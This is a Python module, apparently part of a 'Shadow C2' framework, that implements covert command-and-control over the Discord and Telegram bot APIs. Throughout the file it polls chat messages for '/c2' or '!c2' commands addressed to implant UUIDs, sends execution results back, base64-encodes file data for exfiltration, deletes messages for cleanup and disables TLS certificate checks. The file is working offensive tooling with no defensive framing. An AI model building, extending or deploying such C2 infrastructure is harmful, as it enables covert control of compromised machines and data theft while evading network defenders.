#!/usr/bin/env python3
"""
Shadow C2 — Social Media C2 Channel
Covert C2 over Discord and Telegram APIs.
Commands posted as messages, results as replies/attachments.
"""

import json
import time
import base64
import threading
import logging
from typing import Optional, Callable
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import ssl

from server.c2.channels import BaseChannel
from server.config import (
    DISCORD_BOT_TOKEN, DISCORD_CHANNEL_ID,
    TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
)

logger = logging.getLogger("shadow_c2.channel.social")

# Disable SSL verification for API calls
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


class DiscordC2:
    """Discord bot API wrapper for C2 communications."""

    API_BASE = "https://discord.com/api/v10"

    def __init__(self, bot_token: str, channel_id: str):
        self.bot_token = bot_token
        self.channel_id = channel_id

    def _headers(self) -> dict:
        return {
            "Authorization": f"Bot {self.bot_token}",
            "Content-Type": "application/json",
            "User-Agent": "ShadowC2/1.0",
        }

    def _api_request(self, method: str, endpoint: str,
                     data: dict = None) -> Optional[dict]:
        url = f"{self.API_BASE}{endpoint}"
        body = json.dumps(data).encode() if data else None
        req = Request(url, data=body, headers=self._headers(), method=method)
        try:
            with urlopen(req, context=_SSL_CTX, timeout=10) as resp:
                return json.loads(resp.read())
        except (URLError, HTTPError) as e:
            logger.error(f"Discord API error: {e}")
            return None

    def send_message(self, content: str) -> Optional[dict]:
        """Send a message to the C2 channel."""
        return self._api_request("POST",
                                 f"/channels/{self.channel_id}/messages",
                                 {"content": content})

    def send_file(self, filename: str, file_data: bytes,
                  message: str = "") -> Optional[dict]:
        """Send a file attachment."""
        import io
        b64 = base64.b64encode(file_data).decode()
        # Discord files need multipart, but for simplicity use content
        content = f"{message}\n```\n{b64[:1900]}\n```" if len(b64) < 1900 else message
        return self.send_message(content)

    def get_messages(self, limit: int = 10) -> list:
        """Fetch recent messages from C2 channel."""
        result = self._api_request(
            "GET",
            f"/channels/{self.channel_id}/messages?limit={limit}")
        return result if isinstance(result, list) else []

    def delete_message(self, message_id: str) -> bool:
        """Delete a message (cleanup)."""
        result = self._api_request(
            "DELETE",
            f"/channels/{self.channel_id}/messages/{message_id}")
        return result is not None


class TelegramC2:
    """Telegram Bot API wrapper for C2 communications."""

    API_BASE = "https://api.telegram.org/bot{token}"

    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_base = self.API_BASE.format(token=bot_token)
        self._last_update_id = 0

    def _api_request(self, method: str, params: dict = None) -> Optional[dict]:
        url = f"{self.api_base}/{method}"
        body = json.dumps(params).encode() if params else None
        req = Request(url, data=body,
                      headers={"Content-Type": "application/json"},
                      method="POST")
        try:
            with urlopen(req, context=_SSL_CTX, timeout=10) as resp:
                data = json.loads(resp.read())
                if data.get("ok"):
                    return data.get("result")
        except (URLError, HTTPError) as e:
            logger.error(f"Telegram API error: {e}")
        return None

    def send_message(self, text: str) -> Optional[dict]:
        """Send a message to the C2 chat."""
        return self._api_request("sendMessage", {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
        })

    def get_updates(self, timeout: int = 1) -> list:
        """Long-poll for new messages."""
        result = self._api_request("getUpdates", {
            "offset": self._last_update_id + 1,
            "timeout": timeout,
            "allowed_updates": ["message"],
        })
        if result:
            for update in result:
                uid = update.get("update_id", 0)
                if uid > self._last_update_id:
                    self._last_update_id = uid
            return result
        return []


class SocialMediaChannel(BaseChannel):
    """
    C2 over social media platforms.
    Polls for commands, posts results.
    """

    def __init__(self, handler_callback: Callable = None):
        self.handler_callback = handler_callback
        self.discord: Optional[DiscordC2] = None
        self.telegram: Optional[TelegramC2] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

        # Initialize available platforms
        if DISCORD_BOT_TOKEN and DISCORD_CHANNEL_ID:
            self.discord = DiscordC2(DISCORD_BOT_TOKEN, DISCORD_CHANNEL_ID)
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            self.telegram = TelegramC2(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)

    @property
    def channel_type(self) -> str:
        return "social"

    @property
    def priority(self) -> int:
        return 5

    @property
    def bandwidth_estimate(self) -> str:
        return "medium"

    def start(self):
        if not self.discord and not self.telegram:
            logger.info("Social channel: no platforms configured, skipping")
            return

        self._running = True
        self._thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._thread.start()
        platforms = []
        if self.discord:
            platforms.append("Discord")
        if self.telegram:
            platforms.append("Telegram")
        logger.info(f"Social channel active: {', '.join(platforms)}")

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)

    def is_alive(self) -> bool:
        return self._running

    def _poll_loop(self):
        """Poll social media for commands/messages."""
        while self._running:
            try:
                # Poll Telegram
                if self.telegram:
                    updates = self.telegram.get_updates(timeout=2)
                    for update in updates:
                        msg = update.get("message", {})
                        text = msg.get("text", "")
                        if text.startswith("/c2 "):
                            # Command format: /c2 <uuid> <command>
                            parts = text[4:].split(" ", 1)
                            if len(parts) == 2 and self.handler_callback:
                                self.handler_callback({
                                    "source": "telegram",
                                    "uuid": parts[0],
                                    "command": parts[1],
                                })

                # Poll Discord (less frequently)
                if self.discord:
                    messages = self.discord.get_messages(limit=5)
                    for msg in messages:
                        content = msg.get("content", "")
                        if content.startswith("!c2 "):
                            parts = content[4:].split(" ", 1)
                            if len(parts) == 2 and self.handler_callback:
                                self.handler_callback({
                                    "source": "discord",
                                    "uuid": parts[0],
                                    "command": parts[1],
                                })

                time.sleep(5)  # Poll interval

            except Exception as e:
                logger.error(f"Social channel poll error: {e}")
                time.sleep(10)

    def send_result(self, platform: str, result: str):
        """Post command result to social media."""
        # Truncate for platform limits
        if platform == "discord" and self.discord:
            self.discord.send_message(f"```\n{result[:1900]}\n```")
        elif platform == "telegram" and self.telegram:
            self.telegram.send_message(f"<pre>{result[:4000]}</pre>")
